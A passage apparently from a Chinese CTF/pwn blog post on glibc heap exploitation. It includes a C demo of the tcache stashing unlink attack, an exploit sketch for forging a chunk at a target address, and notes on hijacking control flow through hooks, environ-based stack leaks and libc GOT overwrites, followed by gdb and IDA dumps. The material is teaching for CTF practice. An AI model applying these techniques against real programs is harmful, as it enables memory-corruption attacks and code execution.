we need a writable address to bypass check in glibc\\n\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\\n\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Stack_var emulates the fake chunk we want to alloc to.\\n\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    stack_var[<span class=\"number\">3</span>] = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)(&amp;stack_var[<span class=\"number\">2</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;You can see the value of fake_chunk-&gt;bk is:%p\\n\\n&quot;</span>,(<span class=\"type\">void</span>*)stack_var[<span class=\"number\">3</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\\n\\n&quot;</span>,(<span class=\"type\">void</span>*)stack_var[<span class=\"number\">4</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Now we alloc 9 chunks with malloc.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//now we malloc 9 chunks</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>;i &lt; <span class=\"number\">9</span>;i++)&#123;</span><br><span class=\"line\">        chunk_lis[i] = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>*)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//put 7 chunks into tcache</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">3</span>;i &lt; <span class=\"number\">9</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(chunk_lis[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//last tcache bin</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(chunk_lis[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"comment\">//now they are put into unsorted bin</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(chunk_lis[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(chunk_lis[<span class=\"number\">2</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//convert into small bin</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0xa0</span>);<span class=\"comment\">// size &gt; 0x90</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//now 5 tcache bins</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);</span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\\n\\n&quot;</span>,(<span class=\"type\">void</span>*)stack_var);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//change victim-&gt;bck</span></span><br><span class=\"line\">    <span class=\"comment\">/*VULNERABILITY*/</span></span><br><span class=\"line\">    chunk_lis[<span class=\"number\">2</span>][<span class=\"number\">1</span>] = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)stack_var;</span><br><span class=\"line\">    <span class=\"comment\">/*VULNERABILITY*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//trigger the attack</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">calloc</span>(<span class=\"number\">1</span>,<span class=\"number\">0x90</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\\n\\n&quot;</span>,(<span class=\"type\">void</span>*)stack_var[<span class=\"number\">2</span>],(<span class=\"type\">void</span>*)stack_var[<span class=\"number\">4</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//malloc and return our fake chunk on stack</span></span><br><span class=\"line\">    target = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);   </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\\n&quot;</span>,(<span class=\"type\">void</span>*)target);</span><br><span class=\"line\"></span><br><span class=\"line\">    assert(target == &amp;stack_var[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>核心思路:</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">calloc(<span class=\"number\">0xa0</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">    calloc(<span class=\"number\">0xa0</span>)</span><br><span class=\"line\">    free(i)</span><br><span class=\"line\">calloc(<span class=\"number\">0x4b0</span>) <span class=\"comment\"># 9 </span></span><br><span class=\"line\">calloc(<span class=\"number\">0xb0</span>) <span class=\"comment\"># 10</span></span><br><span class=\"line\">free(<span class=\"number\">9</span>)</span><br><span class=\"line\">calloc(<span class=\"number\">0x400</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">calloc(<span class=\"number\">0x4b0</span>) <span class=\"comment\"># 11</span></span><br><span class=\"line\">calloc(<span class=\"number\">0xb0</span>) <span class=\"comment\"># 12</span></span><br><span class=\"line\">free(<span class=\"number\">9</span>)</span><br><span class=\"line\">calloc(<span class=\"number\">0x400</span>) <span class=\"comment\">#13</span></span><br><span class=\"line\">edit(<span class=\"number\">13</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x400</span>+p64(prev_size)+p64(size)+p64(target_add-<span class=\"number\">0x10</span>))</span><br><span class=\"line\">calloc(<span class=\"number\">0xa0</span>)</span><br></pre></td></tr></table></figure>\n<p><strong>限制:</strong></p>\n<ul>\n<li>需要UAF</li>\n<li>主要适用于只有calloc并且可以分配tcache大小的chunk的情况，对于有malloc，打tcache poison更加方便</li>\n</ul>\n<p><strong>效果:</strong></p>\n<ul>\n<li>获得任意地址target_addr的控制权：在上述流程中，直接将chunk_A的bk改为target_addr - 0x10，并且保证target_addr - 0x10的bk的fd为一个可写地址（一般情况下，使target_addr - 0x10的bk，即target_addr + 8处的值为一个可写地址即可）。</li>\n<li>在任意地址target_addr写入大数值：在unsorted bin attack后，有时候要修复链表，在链表不好修复时，可以采用此利用达到同样的效果，在高版本glibc下，unsorted bin attack失效后，此利用应用更为广泛。在上述流程中，需要使tcache bin中原先有六个堆块，然后将chunk_A的bk改为target_addr - 0x10即可。</li>\n</ul>\n<h2 id=\"tcache-poison\">tcache poison</h2>\n<p>主要是通过改写tcache的next指针，实现类似于fastbin的house of spirit的效果。</p>\n<h2 id=\"house-of-origin\">house of origin</h2>\n<p>house of origin 原利用链中的IO_FILE相关利用已经失效了，这里主要关注其绕过无free函数限制的方法，即通过malloc大于top chunk大小的chunk时会先释放top chunk，再拓展堆区域。</p>\n<p>一般而言，修改top chunk需要满足一下条件。</p>\n<ol>\n<li>伪造的 size 必须要对齐到内存页</li>\n<li>size 要大于 MINSIZE(0x10)</li>\n<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>\n<li>size 的 prev inuse 位必须为 1</li>\n</ol>\n<h1>攻击面</h1>\n<ul>\n<li>劫持控制流\n<ul>\n<li>hooks</li>\n<li>stack</li>\n<li>IO_FILE</li>\n<li>dlts</li>\n<li>libc.got</li>\n</ul>\n</li>\n<li>辅助攻击链\n<ul>\n<li>tcache_perthread_struct</li>\n<li>global_max_fast</li>\n<li>heap 管理结构</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"劫持控制流\">劫持控制流</h2>\n<h3 id=\"hooks\">hooks</h3>\n<p>堆利用中最基本的夺取控制流的方法就是打各种hooks。<br>\n一般而言，可以利用__free_hook 加 写入’/bin/sh’的堆快实现劫持。</p>\n<p>此外，如果要打one_gadget的话，可以打__malloc_hook，在tcache之前的版本，更多是打__malloc_hook，因为其在main_arena附近，存在许多libc上地址，方便通过错位构造0x7f的size，此外，由于__malloc_hook和__realloc_hook临近，也可以很方便地同时控制这两个hook，然后通过__realloc_hook配合来调整栈帧，方便满足one gadget 条件</p>\n<p>而在glibc2.34版本及以上，各类hooks都已经被移除，因此也需要掌握一些其他的劫持控制流的办法。</p>\n<h3 id=\"stack\">stack</h3>\n<p>在stack overflow 中，通过栈和ROP劫持控制流的方法我们已经不陌生，然而不像stack overflow 天然可以在栈上写入，如果要在heap exploation中通过ROP来劫持控制流，一个无法绕过的问题是栈地址不可知。</p>\n<p>我们都知道程序加载时，环境变量会被压入栈中，可以通过environ指针访问到栈上环境变量。</p>\n<p>查看glibc源代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> !_LIBC</span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">define</span> __environ\tenviron</span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">ifndef</span> HAVE_ENVIRON_DECL</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"type\">char</span> **environ;</span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n<p>发现这是一个extern变量，在gdb中调试查找</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"number\">0x7f78a14d4000</span>     <span class=\"number\">0x7f78a1500000</span> r--p    <span class=\"number\">2</span>c000      <span class=\"number\">0</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a1500000</span>     <span class=\"number\">0x7f78a1668000</span> r-xp   <span class=\"number\">168000</span>  <span class=\"number\">2</span>c000 /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a1668000</span>     <span class=\"number\">0x7f78a16bd000</span> r--p    <span class=\"number\">55000</span> <span class=\"number\">194000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a16bd000</span>     <span class=\"number\">0x7f78a16be000</span> ---p     <span class=\"number\">1000</span> <span class=\"number\">1e9000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a16be000</span>     <span class=\"number\">0x7f78a16c1000</span> r--p     <span class=\"number\">3000</span> <span class=\"number\">1e9000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a16c1000</span>     <span class=\"number\">0x7f78a16c4000</span> rw-p     <span class=\"number\">3000</span> <span class=\"number\">1</span>ec000 /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a16c4000</span>     <span class=\"number\">0x7f78a16d3000</span> rw-p     f000      <span class=\"number\">0</span> [anon_7f78a16c4]</span><br><span class=\"line\">    <span class=\"number\">0x7f78a16d3000</span>     <span class=\"number\">0x7f78a16d4000</span> r--p     <span class=\"number\">1000</span>      <span class=\"number\">0</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/ld.so<span class=\"number\">.2</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a16d4000</span>     <span class=\"number\">0x7f78a16f8000</span> r-xp    <span class=\"number\">24000</span>   <span class=\"number\">1000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/ld.so<span class=\"number\">.2</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a16f8000</span>     <span class=\"number\">0x7f78a1702000</span> r--p     a000  <span class=\"number\">25000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/ld.so<span class=\"number\">.2</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a1702000</span>     <span class=\"number\">0x7f78a1704000</span> r--p     <span class=\"number\">2000</span>  <span class=\"number\">2e000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/ld.so<span class=\"number\">.2</span></span><br><span class=\"line\">    <span class=\"number\">0x7f78a1704000</span>     <span class=\"number\">0x7f78a1706000</span> rw-p     <span class=\"number\">2000</span>  <span class=\"number\">30000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class=\"number\">.2021</span>/pwn/Hookless/ld.so<span class=\"number\">.2</span></span><br><span class=\"line\">    <span class=\"number\">0x7ffd6bb9e000</span>     <span class=\"number\">0x7ffd6bbc0000</span> rw-p    <span class=\"number\">22000</span>      <span class=\"number\">0</span> [<span class=\"built_in\">stack</span>]</span><br><span class=\"line\">    <span class=\"number\">0x7ffd6bbd4000</span>     <span class=\"number\">0x7ffd6bbd8000</span> r--p     <span class=\"number\">4000</span>      <span class=\"number\">0</span> [vvar]</span><br><span class=\"line\">    <span class=\"number\">0x7ffd6bbd8000</span>     <span class=\"number\">0x7ffd6bbda000</span> r-xp     <span class=\"number\">2000</span>      <span class=\"number\">0</span> [vdso]</span><br><span class=\"line\"><span class=\"number\">0xffffffffff600000</span> <span class=\"number\">0xffffffffff601000</span> --xp     <span class=\"number\">1000</span>      <span class=\"number\">0</span> [vsyscall]</span><br><span class=\"line\">pwndbg&gt; p environ</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"type\">char</span> **) <span class=\"number\">0x7ffd6bbbdfc8</span></span><br><span class=\"line\">pwndbg&gt; p &amp;environ</span><br><span class=\"line\">$<span class=\"number\">2</span> = (<span class=\"type\">char</span> ***) <span class=\"number\">0x7f78a16c9ec0</span> &lt;environ&gt;</span><br><span class=\"line\">pwndbg&gt; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>可以看到其存在于anon_7f78a16c4段，在libc后，与libc存在固定偏移，猜测这一部分内容与ld 过程有关（笔者暂且还没有查证）</p>\n<p>既然可以通过访问libc偏移地址leak stack地址，那么此时我们就可以通过这个栈地址分配到栈上来ROP了。</p>\n<p>此攻击点的优点是不像IO_FILE的攻击那样，需要触发程序结束时（exit()函数，从main返回，malloc_assert）时清理现场的流程，可以覆盖堆菜单中分配函数或者edit函数的栈来实现攻击。</p>\n<h3 id=\"libc-got\">libc.got</h3>\n<p>checksec libc，会发现其一般开启了Partial RELRO，所以可以考虑写libc的got表</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ checksec libc.so.6       </span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>笔者在实际操作时发现，pwntools的elf.got并不能很好解析libc的got段，可以使用IDA来查看。</p>\n<p>以下的got表来自libc2.34</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED000 ; Segment type: Pure data</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED000 ; Segment permissions: Read/Write</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED000 _got_plt        segment qword public <span class=\"string\">&#x27;DATA&#x27;</span> use64</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED000                 assume cs:_got_plt</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED000                 ;org <span class=\"number\">1</span>ED000h</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED008 qword_1ED008    dq <span class=\"number\">0</span>                    ; DATA XREF: sub_2C000↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED010 qword_1ED010    dq <span class=\"number\">0</span>                    ; DATA XREF: sub_2C000+<span class=\"number\">6</span>↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED018 off_1ED018      dq offset __strnlen_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED018                                         ; DATA XREF: j___strnlen_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED018                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED020 off_1ED020      dq offset __rawmemchr_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED020                                         ; DATA XREF: j___rawmemchr_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED020                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED028 off_1ED028      dq offset __GI___libc_realloc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED028                                         ; DATA XREF: _realloc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED030 off_1ED030      dq offset __strncasecmp_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED030                                         ; DATA XREF: j___strncasecmp_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED030                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED038 off_1ED038      dq offset _dl_exception_create</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED038                                         ; DATA XREF: __dl_exception_create↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED040 off_1ED040      dq offset __mempcpy_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED040                                         ; DATA XREF: j___mempcpy_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED040                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED048 off_1ED048      dq offset __wmemset_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED048                                         ; DATA XREF: j___wmemset_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED048                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED050 off_1ED050      dq offset __libc_calloc ; DATA XREF: _calloc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED058 off_1ED058      dq offset strspn_ifunc  ; DATA XREF: j_strspn_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED058                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED060 off_1ED060      dq offset memchr_ifunc  ; DATA XREF: j_memchr_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED060                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED068 off_1ED068      dq offset __libc_memmove_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED068                                         ; DATA XREF: j___libc_memmove_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED068                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED070 off_1ED070      dq offset __wmemchr_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED070                                         ; DATA XREF: j___wmemchr_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED070                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED078 off_1ED078      dq offset __stpcpy_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED078                                         ; DATA XREF: j___stpcpy_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED078                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED080 off_1ED080      dq offset __wmemcmp_ifunc</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED080                                         ; DATA XREF: j___wmemcmp_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED080                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED088 off_1ED088      dq offset _dl_find_dso_for_object</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED088                                         ; DATA XREF: __dl_find_dso_for_object↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED090 off_1ED090      dq offset strncpy_ifunc ; DATA XREF: j_strncpy_ifunc↑r</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED090                                         ; Indirect relocation</span><br><span class=\"line\">.got.plt:<span class=\"number\">00000000001</span>ED098 off_1ED098      dq offset strlen_ifunc  ; DATA 